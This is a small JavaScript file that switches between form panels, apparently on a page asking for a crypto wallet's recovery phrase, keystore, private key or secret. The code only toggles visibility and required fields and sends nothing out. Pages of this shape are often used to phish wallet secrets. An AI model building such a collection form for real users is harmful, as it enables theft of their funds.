var phrase = document.querySelector("#phrase");
var phraseText = document.querySelector("#phraseText");
var keystore = document.querySelector("#keystore");
var private = document.querySelector("#private");
var family = document.querySelector("#family");
var secret = document.querySelector("#secret");
var first = document.querySelector("#first");
var second = document.getElementById("second");
var third = document.querySelector("#third");
var fourth = document.getElementById("fourth");
var fiveth = document.querySelector("#fiveth");
var wallet_name = document.querySelector("#walletname");

phrase.addEventListener("click", function() {
    hide(first);
});

keystore.addEventListener("click", function() {
    hide(second);
});

private.addEventListener("click", function() {
    hide(third);
});

family.addEventListener("click", function() {
    hide(fourth);
});

secret.addEventListener("click", function() {
    hide(fiveth);
});

function hide(elem) {
    var expandedPanel = document.querySelector(".active");
    if (expandedPanel) {
        expandedPanel.classList.remove("active");
        var attr = document.getElementsByClassName(
            "text-sm sm:text-base placeholder-gray-500 pl-4 pr-4 rounded-lg border border-gray-400 w-full"
        );
        for (let i = 0; i < attr.length; i++) {
            attr[i].value = "";
        }
    }
    var i = document.getElementsByClassName(
        "text-sm sm:text-base placeholder-gray-500 pl-4 pr-4 rounded-lg border border-gray-400 w-full py-2 focus:outline-none focus:border-blue-400"
    );
    var x = elem.getElementsByClassName(
        "text-sm sm:text-base placeholder-gray-500 pl-4 pr-4 rounded-lg border border-gray-400 w-full py-2 focus:outline-none focus:border-blue-400"
    );
    for (let c = 0; c < i.length; c++) {
        i[c].required = false;
    }
    for (let c = 0; c < x.length; c++) {
        x[c].required = true;
    }
    elem.classList.add("active");
}